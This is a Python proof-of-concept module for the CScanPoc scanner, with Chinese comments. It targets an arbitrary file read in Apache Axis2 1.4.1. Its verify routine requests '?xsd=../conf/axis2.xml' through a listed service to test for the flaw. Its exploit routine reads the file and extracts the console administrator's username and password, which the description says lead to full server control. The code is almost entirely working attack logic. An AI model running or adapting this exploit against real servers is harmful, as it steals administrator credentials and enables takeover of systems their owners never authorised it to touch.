# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
import urllib.request
import urllib.error
import urllib.parse


class Vuln(ABVuln):
    vuln_id = 'Apache-Axis2_0000'  # 平台漏洞编号
    name = 'Apache-Axis2 任意文件读取'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.LFI  # 漏洞类型
    disclosure_date = '2010-05-24'  # 漏洞公布时间
    desc = '''
        通过此漏洞可以读取配置文件等信息，进而登陆控制台，通过部署功能可直接获取服务器权限。
    '''  # 漏洞描述
    ref = 'https://www.securityfocus.com/bid/40343/info'  # https://www.securityfocus.com/bid/40343/info
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Apache-Axis2'  # 漏洞组件名称
    product_version = '1.4.1'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '51683b2e-0211-44bd-8412-4197e91a360e'  # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-06-01'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            timeout = 5
            url = '{target}'.format(target=self.target)
            res = urllib.request.urlopen(
                url + '/axis2/services/listServices', timeout=timeout)
            res_code = res.code
            res_html = res.read()
            if int(res_code) == 404:
                return
            m = re.search('\/axis2\/services\/(.*?)\?wsdl">.*?<\/a>', res_html)
            if m:
                if m.group(1):
                    server_str = m.group(1)
                    read_url = url + \
                        '/axis2/services/%s?xsd=../conf/axis2.xml' % (
                            server_str)
                    res = urllib.request.urlopen(read_url, timeout=timeout)
                    res_html = res.read()
                    if 'axisconfig' in res_html:
                        self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                            target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 漏洞利用'.format(
                target=self.target, vuln=self.vuln))
            timeout = 5
            url = '{target}'.format(target=self.target)
            res = urllib.request.urlopen(
                url + '/axis2/services/listServices', timeout=timeout)
            res_code = res.code
            res_html = res.read()
            if int(res_code) == 404:
                return
            m = re.search('\/axis2\/services\/(.*?)\?wsdl">.*?<\/a>', res_html)
            if m:
                if m.group(1):
                    server_str = m.group(1)
                    read_url = url + \
                        '/axis2/services/%s?xsd=../conf/axis2.xml' % (
                            server_str)
                    res = urllib.request.urlopen(read_url, timeout=timeout)
                    res_html = res.read()
                    if 'axisconfig' in res_html:
                        user = re.search(
                            '<parameter name="userName">(.*?)</parameter>', res_html)
                        password = re.search(
                            '<parameter name="password">(.*?)</parameter>', res_html)
                        self.output.report(self.vuln, '发现{target}存在{name}漏洞，获取到的用户名为{username} 密码为{password}'.format(
                            target=self.target, name=self.vuln.name, username=user, password=password))
        except Exception as e:
            self.output.info('执行异常{}'.format(e))


if __name__ == '__main__':
    Poc().run()
